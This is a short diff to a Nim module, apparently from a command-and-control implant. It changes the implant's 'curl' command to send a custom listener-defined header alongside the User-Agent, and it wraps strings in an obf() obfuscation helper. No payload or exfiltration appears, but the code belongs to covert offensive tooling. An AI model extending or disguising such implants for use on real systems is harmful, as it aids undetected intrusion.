@@ -4,7 +4,7 @@ from ../util/webClient import Listener
 
 # Curl an HTTP webpage to stdout
 proc curl*(li : Listener, args : varargs[string]) : string =
-    var 
+    var
         output : string
         url = args.join(obf(" "))
     if url == "":
@@ -12,7 +12,10 @@ proc curl*(li : Listener, args : varargs[string]) : string =
     else:
         output = fetch(
                     url,
-                    headers = @[Header(key: obf("User-Agent"), value: li.userAgent)]
+                    headers = @[
+                        Header(key: obf("User-Agent"), value: li.userAgent),
+                        Header(key: obf("X-Header"), value: li.customHeaderOne)
+                      ]
                     )
 
         if output == "":
